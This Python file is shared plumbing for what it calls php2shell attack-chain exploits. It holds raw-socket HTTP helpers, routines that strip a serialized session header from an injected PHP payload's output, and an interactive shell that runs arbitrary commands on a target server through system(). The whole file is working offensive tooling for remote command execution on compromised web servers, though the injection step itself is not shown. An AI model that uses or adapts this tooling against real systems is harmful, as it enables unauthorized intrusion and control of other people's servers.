#!/usr/bin/env python3
"""
Shared plumbing for the php2shell attack-chain exploits.

Kept deliberately small: raw HTTP over a socket (so multipart bodies and
malformed requests behave exactly as we write them), an interactive command
shell driven through a remote-execution callable, and the output-cleaning
helpers needed because the injected payload is always preceded by the
serialized session header.
"""

import os
import socket
import sys
import urllib.error
import urllib.request
from urllib.parse import quote, urlparse

# Emitted by the injected PHP so we can strip the session-file prefix and
# frame command output. Never appears in serialized session data.
SENTINEL = b"\x02"
MARKER = "P2S_OK"


# --------------------------------------------------------------------------
# network
# --------------------------------------------------------------------------

def http_exchange(host, port, raw, timeout=20.0):
    """Send a raw HTTP request and read the whole response."""
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(raw)
        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            resp += chunk
        return resp
    finally:
        sock.close()


def http_get(url, timeout=20.0):
    """GET a URL. Returns (body_bytes, error_or_None)."""
    req = urllib.request.Request(url, headers={"User-Agent": "php2shell"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read(), None
    except urllib.error.HTTPError as exc:
        return exc.read(), f"HTTP {exc.code}"
    except Exception as exc:
        return b"", str(exc)


def split_target(target):
    """Validate and normalise http:// URLs into (host, port, base)."""
    parsed = urlparse(target)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("target must be a plain http:// URL")
    host, port = parsed.hostname, parsed.port or 80
    base = f"http://{host}" + (f":{port}" if port else "")
    return host, port, base


# --------------------------------------------------------------------------
# output handling
# --------------------------------------------------------------------------

def clean_output(body):
    """Strip everything the session file prints before the injected payload."""
    idx = body.find(SENTINEL)
    if idx == -1:
        return body
    body = body[idx + 1:]
    end = body.find(SENTINEL)
    return body[:end] if end != -1 else body


def decode(data):
    return data.decode("latin-1", "replace")


def print_block(data):
    text = decode(data)
    sys.stdout.write(text)
    if text and not text.endswith("\n"):
        sys.stdout.write("\n")
    sys.stdout.flush()


# --------------------------------------------------------------------------
# interactive shell
# --------------------------------------------------------------------------

HELP = """\
  exit / quit      leave the shell
  cd <dir>         change the remote working directory
  help             this text
  <anything else>  executed via system() on the target"""


def interactive_shell(exec_fn, banner, prompt="p2s> "):
    """Command loop on top of exec_fn(cmd) -> (stdout_bytes, error).

    Each command is a separate HTTP request, so state is kept only for the
    working directory, which is prepended client-side.
    """
    print(banner)
    print("    note: each command is a new request, no persistent state")
    print()
    cwd = None
    while True:
        try:
            line = input(prompt)
        except EOFError:
            print()
            return 0
        except KeyboardInterrupt:
            print()
            continue

        line = line.strip()
        if not line:
            continue
        if line in ("exit", "quit"):
            return 0
        if line == "help":
            print(HELP)
            continue

        if (line == "cd" or line.startswith("cd ")) and not any(
            op in line for op in (";", "&", "|")
        ):
            cwd = line[2:].strip() or "/"
            print(f"    cwd -> {cwd}")
            continue

        cmd = f"(cd {cwd} 2>/dev/null; {line}) 2>&1" if cwd else f"({line}) 2>&1"
        out, err = exec_fn(cmd)
        if err:
            print(f"[!] {err}")
            continue
        print_block(out)
